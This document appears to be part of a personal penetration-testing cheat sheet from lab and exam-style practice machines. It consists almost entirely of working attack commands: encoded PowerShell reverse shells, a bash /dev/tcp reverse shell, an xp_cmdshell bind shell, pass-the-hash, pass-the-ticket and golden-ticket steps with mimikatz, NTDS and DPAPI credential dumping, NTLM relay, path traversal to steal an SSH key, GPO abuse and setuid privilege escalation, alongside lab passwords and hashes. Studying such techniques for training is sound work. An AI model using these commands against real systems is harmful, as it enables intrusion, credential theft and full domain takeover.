+PS > $Session = New-Cimsession -ComputerName 192.168.232.73 -Credential $credential -SessionOption $Options
+PS > $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
+PS > Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+[Winrs]		(jen user needs to be part of the Administrators or Remote Management Users group on the target host and we need her password. we can be on another machine and another user)
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+[Powershell Remoting]
+PS> $username = 'jen';
+PS> $password = 'Nexus123!';
+PS> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+PS> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+PS> New-PSSession -ComputerName 192.168.128.151 -Credential $credential
+PS> Enter-PSSession 1
+
+[PsExec]		(user that authenticates on the target machine needs to be local admins group member)
+.\PsExec64.exe -i  \\WEB04 -u corp\jen -p Nexus123! cmd
+
+[Overpass the hash]
+mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+[hash of the account you want to be so jen's hash]
+net use \\files04	(now we can authenticate to this share as jen and also then we have TGT kerberos tickets)
+.\PsExec.exe \\files04 cmd              (launch cmd remotely on the files04 machine as jen with generated TGT ticket. if you donot start cmd and just type whoami after overpassing the hash, it can still show the old user even though you have a kerberos ticket for jen now. you can see your current tickets with klist command.)
+
+[Pass the Ticket]
+mimikatz #sekurlsa::tickets /export
+dir *.kirbi				(view newly generated tickets)
+mimikatz # kerberos::ptt [0;14fe82]-0-0-40810000-dave@cifs-web04.kirbi	(use one of the generated SERVICE tickets not krbtgt ones)
+(then we can access share of web04 over cifs service, which was only permitted to dave, not jen:)
+ls \\web04\backup
+
+[DCOM]			(requires local admin shell)
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.183.72"))
+[this ip is the target machine's ip]
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+[Active Directory Persistence]
+
+[Golden Tickets]
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch		[obtain the NTLM hash of the krbtgt account, along with the domain SID]
+[from this point on, creating the golden ticket or injecting it does not require any admin privileges and can even be performed from a computer that is not joined to the domain]
+mimikatz # kerberos::purge		(delete any existing tickets)
+mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+[now we can:]
+PsExec.exe \\dc1 cmd.exe		[we are elevated to Domain Admins group and can access this machine. note that if you use ip instead of hostname, it would default to ntlm authentication and this ticket would not work.]
+
+[Shadow Copies]			(requires domain admin user)
+vshadow.exe -nw -p  C: 		(take note of SHADOW COPY DEVICE NAME)
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+(Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2)
+reg.exe save hklm\system c:\system.bak
+(now with these 2 files from our own kali machine:)
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+_____________________________________________________________________________________________
+
+ASSEMBLING THE PIECES
+
+gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config			(recommended extensions for gobuster)
+
+whatweb http://192.168.50.244		(web server tech stack enumeration)
+
+wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+
+:!/bin/bash		(if vi/vim/less has sudo privileges we can run this command)
+
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap	(command line tool to send email over smtp with john's found credentials)
+
+[Custom Bloodhound Commands]
+MATCH (m:Computer) RETURN m		(returns all machines)
+nslookup INTERNALSRV1.BEYOND.COM	(we can query ip address of new found machines)
+MATCH (m:User) RETURN m			(show all users)
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p		(list all active sessions (logged in))
+[Recommended Pre-Built Bloodhound Queries]
+Find all Domain Admins
+Find Workstations where Domain Users can RDP
+Find Servers where Domain Users can RDP
+Find Computers where Domain Users are Local Admin
+Shortest Path to Domain Admins from Owned Principals
+List all Kerberoastable Accounts
+
+sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254	(port scanning the internal network computers with socks)
+
+[chisel to reach internal network]
+kali > ./chisel server -p 8080 --reverse
+target machine > chisel.exe client 192.168.45.219:8080 R:80:172.16.187.241:80  (kali:kaliport R:localport:remotehost:remoteport)
+
+impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john	(kerberoasting daniela remotely via impacket, and john's credentials)
+
+[SMB No signing required Relay Attack]
+(We'll force an authentication request by the Backup directory path of the Backup Migration WordPress plugin on INTERNALSRV1. Setting the destination path to our Kali, we use impacket-ntlmrelayx to relay the incoming connection to MAILSRV1. We guess that the local administrator account of INTERNALSRV1, has the same password as the local Administrator account on MAILSRV1.)
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."		(192.168.50.242 is the external IP for MAILSRV1)
+//192.168.119.5/test 	(we set backup address to our kali IP in the WP Backup Migration Plugin)
+
+_______________________________________________________________________________________________
+
+BOX: MEDTECH
+
+(sqlcmd to run mssql from win terminal:)
+Invoke-Sqlcmd -ServerInstance "localhost\SQLEXPRESS" -Username sa -Password "WhileChirpTuesday218" -Query "SELECT name FROM sys.databases"
+Invoke-Sqlcmd -ServerInstance "localhost\SQLEXPRESS" -Username sa -Password "WhileChirpTuesday218" -Database "webapp" -Query "SELECT * FROM INFORMATION_SCHEMA.TABLES"
+Invoke-Sqlcmd -ServerInstance "localhost\SQLEXPRESS" -Username sa -Password "WhileChirpTuesday218" -Database "webapp" -Query "SELECT * FROM users"
+Invoke-Sqlcmd -ServerInstance "localhost\SQLEXPRESS" -Username sa -Password "WhileChirpTuesday218" -Database master -Query "SELECT name, password_hash FROM sys.sql_logins"
+
+[dpapi dump local credentials]
+dpapi::masterkey /in:C:\Users\wario\AppData\Roaming\Microsoft\Protect\S-1-5-21-976142013-3766213998-138799841-1109\d38e6c31-e65a-4085-a268-e544d61716f1 /system
+dpapi::cred /in:C:\Users\wario\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:fbfba63fb72f6eab674076ab198f2b83a4289de49b715e4ec583feb834091f9c697a876c7d5e66bd8a52674192a631af719709f0fdf40989fb53bc28d479581a6d79e24e88b2b289ede9040bdd8bfc295dc74fbcf9f9a858a756ca3c84a302c9c66e4ef7546d1adb
+dpapi::cred /in:C:\Users\wario\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /system
+
+
+BOX:KIERO
+
+(there was a binary with setuid bit set and runs chpasswd as relative path)
+export PATH=/opt/admin:$PATH
+nano chpasswd
+  #!/bin/bash
+  bash -p -c "bash -i >& /dev/tcp/192.168.45.249/4444 0>&1"	(-p flag to retain setuid)
+
+
+BOX:OSCPB
+
+sudo proxychains impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.131.154 -windows-auth
+(then use mssql xpcmd_shell)
+EXEC xp_cmdshell 'powershell -nop -c "$l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,6666);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"'
+(opened a bind listener from MS02 machine over mssql xp_cmdshell)
+sudo proxychains nc 9999		(connect to the bind shell over our kali machine)
+
+[FILE SHARING TO/THROUGH PIVOTS]
+[base64 over win terminal]
+base64 file.exe			(from kali)
+echo BASE64STRING > file.b64    (from win to write to a file)
+certutil -decode file.b64 file.exe (from windows to decode after receiving)
+(from win to kali)
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("c:\users\public\20260314200656_BloodHound.zip"))
+[smb]
+mkdir C:\share
+net share share=C:\share /grant:Everyone,FULL
+(and inner subnet machine can cp from \\ms01\share)
+
+
+BOX:CHARLIE
+
+[tar * expansion exploit]
+(root was running a cronjob under /opt/admin folder with tar *)
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
+chmod +x shell.sh
+/tmp/rootbash -p
+
+BOX:OSCPC
+
+sudo proxychains nmap -sT -Pn -sV 10.10.131.154		(use -sT flag for proxychains)
+
+sudo proxychains crackmapexec smb 10.10.131.154 -u dave4 -p password123 -d .  (since dave4 is a local user, and not a DA you need to tell cme explicitly)
+sudo proxychains impacket-psexec MS02/Administrator@10.10.131.154 (same for impacket, ms02 or .)
+sudo proxychains impacket-psexec -hashes 00000000000000000000000000000000:59b280ba707d22e3ef0aa587fc29ffe5 oscp/Administrator@10.10.131.152	(if you have a DA hash, you need to add oscp/administrator, not just administrator. same for cme you need to let it know domain with -d flag)
+
+(how to use a saved request file with ffuf, when it is multipart and too complicated for hydra)
+ffuf -request vestalogin.req -w /usr/share/wordlists/rockyou.txt -request-proto https
+
+BOX:SECURA
+
+[dynamic reverse proxychains with chisel]
+chisel server -p 8008 --reverse
+.\chisel.exe client 192.168.45.160:8008 R:socks
+Start-Process .\chisel.exe -ArgumentList "client 192.168.45.208:8008 R:socks"	(start as a bg process without losing your shell)
+
+[postgres basic commands]
+postgres=# \list		(show db)
+postgres=# \c amdb		(connect db)
+amdb=# \dt			(describe tables)
+
+[Remote Desktop Credential Manager]
+%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings 
+(Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module there was this explanation in the hacktricks, but there were no rdg files in that folder. just a .settings file that had cleartext passwords)
+
+[GPO Abuse]
+(bloodhound showed that charlotte user has writeall on Default Domain Policy)
+Import-Module .\powerview.ps1
+$SecPassword = ConvertTo-SecureString 'Game2On4.!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('SECURA\charlotte',$SecPassword)
+Set-DomainObjectOwner -Credential $Cred -Identity "Default Domain Policy" -OwnerIdentity charlotte
+Get-DomainGPO -Identity "Default Domain Policy"		(received an error saying that policy name couldnt be resolved so we should get the full distinguished name)
+Set-DomainObjectOwner -Credential $Cred -Identity "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=secura,DC=yzx" -OwnerIdentity "charlotte"
+.\Sharpgpoabuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
+gpupdate /force
+(and re-login to change token and see your new admin privileges)
+
+BOX:RELIA
+
+GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/home/anita/.ssh/id_ecdsa HTTP/1.1		(authorized keys file showed different encryption than rsa)
+
+gobuster dir -u http://login.relia.com -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x aspx,txt,ini -H "Authorization: Basic amltQHJlbGlhLmNvbTpDYXN0ZWxsbzEh"
+(use basic authentication credentials with gobuster)
+
+[hashcat bruteforce]
+hashcat -m 0 -a 3 newhashes -1 ?l?u?d ?1?1?1?1?1?1?1?1 --increment --increment-max=10    (uppercase,lowercase,digits)
+hashcat -m 0 -a 3 newhashes ?a?a?a?a?a?a?a?a --increment --increment-max=10 (upper,lower,digit,special chars)
+
+BOX:AERO
+
+(user owned cronjobs that are writeable by us)
+#!/usr/bin/python2.7
+import os
+os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")
+(then run)
+/tmp/rootbash -p
